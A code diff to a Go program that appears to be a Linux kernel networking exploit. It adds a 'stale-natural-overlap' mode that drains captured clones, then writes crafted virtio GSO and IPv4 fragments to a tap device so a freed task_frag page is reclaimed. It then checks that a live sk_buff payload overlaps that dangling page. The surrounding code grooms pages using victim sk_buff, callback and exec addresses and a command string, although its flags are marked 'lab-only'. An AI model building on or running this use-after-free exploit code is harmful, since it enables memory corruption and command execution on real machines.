@@ -53,61 +53,62 @@ func main() {
 }
 
 type cfg struct {
-	head             int
-	rest             int
-	tebar            int
-	tebarFill        byte
-	capture          time.Duration
-	count            int
-	page             bool
-	skipVerify       bool
-	egress           bool
-	egressRest       int
-	iface            string
-	dst              string
-	src              string
-	gateway          string
-	dstMAC           string
-	egressWait       time.Duration
-	egressSpray      int
-	egressFill       byte
-	sprayDelay       time.Duration
-	vlanTags         int
-	answerDstARP     bool
-	transport        string
-	udpSrcPort       int
-	udpPort          int
-	tcpSrcPort       int
-	tcpPort          int
-	tcpValid         bool
-	tcpEcho          bool
-	staleOptions     bool
-	staleOptSkip     int
-	staleOptLen      int
-	staleGroom       bool
-	staleGrooms      int
-	staleDelay       time.Duration
-	staleEach        time.Duration
-	staleHold        bool
-	staleHead        uint64
-	staleFragPage    uint64
-	staleFragFile    string
-	staleFragSeeds   int
-	staleFragSeedLen int
-	staleFragPadLen  int
-	staleFragGSOType int
-	staleFragHdrLen  int
-	staleNaturalFrag bool
-	staleSKB         uint64
-	staleDev         uint64
-	staleHeadFile    string
-	staleCallback    uint64
-	staleCopyLen     int
-	staleExec        uint64
-	staleNoop        uint64
-	staleCommand     string
-	csumOffset       int
-	csumWord         uint
+	head                int
+	rest                int
+	tebar               int
+	tebarFill           byte
+	capture             time.Duration
+	count               int
+	page                bool
+	skipVerify          bool
+	egress              bool
+	egressRest          int
+	iface               string
+	dst                 string
+	src                 string
+	gateway             string
+	dstMAC              string
+	egressWait          time.Duration
+	egressSpray         int
+	egressFill          byte
+	sprayDelay          time.Duration
+	vlanTags            int
+	answerDstARP        bool
+	transport           string
+	udpSrcPort          int
+	udpPort             int
+	tcpSrcPort          int
+	tcpPort             int
+	tcpValid            bool
+	tcpEcho             bool
+	staleOptions        bool
+	staleOptSkip        int
+	staleOptLen         int
+	staleGroom          bool
+	staleGrooms         int
+	staleDelay          time.Duration
+	staleEach           time.Duration
+	staleHold           bool
+	staleHead           uint64
+	staleFragPage       uint64
+	staleFragFile       string
+	staleFragSeeds      int
+	staleFragSeedLen    int
+	staleFragPadLen     int
+	staleFragGSOType    int
+	staleFragHdrLen     int
+	staleNaturalFrag    bool
+	staleNaturalOverlap bool
+	staleSKB            uint64
+	staleDev            uint64
+	staleHeadFile       string
+	staleCallback       uint64
+	staleCopyLen        int
+	staleExec           uint64
+	staleNoop           uint64
+	staleCommand        string
+	csumOffset          int
+	csumWord            uint
 }
 
 func parseCfg() cfg {
@@ -156,6 +157,7 @@ func parseCfg() cfg {
 	flag.IntVar(&c.staleFragGSOType, "stale-frag-gso-type", 1, "lab-only: virtio-net GSO type used by oversized fragment probes")
 	flag.IntVar(&c.staleFragHdrLen, "stale-frag-hdr-len", 70, "lab-only: linear header length requested for oversized fragment probes")
 	flag.BoolVar(&c.staleNaturalFrag, "stale-natural-frag", false, "use the address-independent jumbo-fragment geometry that naturally plants frags[0]")
+	flag.BoolVar(&c.staleNaturalOverlap, "stale-natural-overlap", false, "lab-only: reclaim the dangling natural-fragment page and verify a live skb payload overlap")
 	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
 	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
 	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
@@ -244,6 +246,10 @@ func parseCfg() cfg {
 	}
 	if c.staleNaturalFrag && !c.staleOptions {
 		fmt.Fprintln(os.Stderr, "-stale-natural-frag requires -stale-options-write")
+		os.Exit(1)
+	}
+	if c.staleNaturalOverlap && !c.staleNaturalFrag {
+		fmt.Fprintln(os.Stderr, "-stale-natural-overlap requires -stale-natural-frag")
 		os.Exit(1)
 	}
 	if c.staleOptions && c.egress && !c.staleNaturalFrag {
@@ -587,7 +593,30 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 		return err
 	}
 
-	pkts := cap.collect(c.capture, id)
+	collectID := id
+	var overlapWant []byte
+	if c.staleNaturalOverlap {
+		// The completed stale-options datagram is emitted as many small
+		// fragments on the lab's MTU-200 veth. The capture socket owns clones
+		// that keep the poisoned task_frag page referenced; drain them before
+		// asking the buddy allocator to hand that page to the second jumbo skb.
+		cap.drain(c.staleDelay)
+		collectID = id + 1
+		middle, overlapHead, overlapTail := staleNaturalOverlapFrames(c, collectID)
+		if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
+			false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: overlap reclaim fragment: %w", err)
+		}
+		if err := writeTap(tap, overlapHead, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: overlap head fragment: %w", err)
+		}
+		if err := writeTap(tap, overlapTail, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: overlap tail fragment: %w", err)
+		}
+		overlapWant = append([]byte(nil), overlapHead[:16]...)
+	}
+
+	pkts := cap.collect(c.capture, collectID)
 	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d groom=%t groom_count=%d groom_each=%s groom_delay=%s groom_hold=%t frag_pad_len=%d\n",
 		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags, c.staleGroom, c.staleGrooms, c.staleEach, c.staleDelay, c.staleHold, c.staleFragPadLen)
 	for i, ip := range pkts {
@@ -607,7 +636,65 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 	if len(pkts) == 0 {
 		return errors.New("stale-options: no output fragments captured")
 	}
+	if c.staleNaturalOverlap {
+		const overlapPayloadOffset = 80
+		got, ok := ipv4PayloadWindow(pkts, overlapPayloadOffset, len(overlapWant))
+		fmt.Printf("stale-options: natural-overlap payload_offset=%d got=%s want=%s matched=%t\n",
+			overlapPayloadOffset, hex.EncodeToString(got), hex.EncodeToString(overlapWant), ok && bytes.Equal(got, overlapWant))
+		if !ok || !bytes.Equal(got, overlapWant) {
+			return errors.New("stale-options: dangling task_frag did not overwrite the live reclaimed fragment page")
+		}
+	}
 	return nil
+}
+
+func staleNaturalOverlapFrames(c cfg, id uint16) (middle, head, tail []byte) {
+	// The second jumbo fragment has the same exact split as the natural
+	// descriptor seed: hdr_len bytes are linear and one order-3 page is
+	// nonlinear. Its logical IPv4 length now retains that whole page, so the
+	// reassembly queue keeps the allocation live instead of trimming it.
+	l2 := l2LenForTags(c.vlanTags)
+	middlePayloadLen := c.staleFragPadLen - l2 - ipLen
+	middlePayload := bytesRepeat(middlePayloadLen, 0x72)
+	middle = frameWithVLAN(ipv4PacketWithOptions(8, true, middlePayload, id, nil), c.vlanTags)
+
+	headPayload := bytesRepeat(8, 0x68)
+	head = frameWithoutVLAN(ipv4PacketWithOptions(0, true, headPayload, id, nil))
+	tailPayload := bytesRepeat(8, 0x7a)
+	tail = frameWithoutVLAN(ipv4PacketWithOptions(8+middlePayloadLen, false, tailPayload, id, nil))
+	return middle, head, tail
+}
+
+func ipv4PayloadWindow(pkts [][]byte, offset, length int) ([]byte, bool) {
+	out := make([]byte, length)
+	seen := make([]bool, length)
+	for _, ip := range pkts {
+		if len(ip) < ipLen {
+			continue
+		}
+		ihl := int(ip[0]&0x0f) * 4
+		end := min(len(ip), int(binary.BigEndian.Uint16(ip[2:])))
+		if ihl < ipLen || ihl > end {
+			continue
+		}
+		fragOffset := int(binary.BigEndian.Uint16(ip[6:])&0x1fff) * 8
+		payload := ip[ihl:end]
+		from := max(offset, fragOffset)
+		to := min(offset+length, fragOffset+len(payload))
+		if from >= to {
+			continue
+		}
+		copy(out[from-offset:to-offset], payload[from-fragOffset:to-fragOffset])
+		for i := from - offset; i < to-offset; i++ {
+			seen[i] = true
+		}
+	}
+	for _, ok := range seen {
+		if !ok {
+			return out, false
+		}
+	}
+	return out, true
 }
 
 func stalePageGroomFrame(fill byte, victimHead, fragPage, _, _, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
@@ -1050,6 +1137,15 @@ func frameWithVLAN(ip []byte, tags int) []byte {
 		off += vlanLen
 	}
 	copy(f[l2:], ip)
+	return f
+}
+
+func frameWithoutVLAN(ip []byte) []byte {
+	f := make([]byte, ethLen+len(ip))
+	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
+	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
+	binary.BigEndian.PutUint16(f[12:], ipProtoEth)
+	copy(f[ethLen:], ip)
 	return f
 }
 
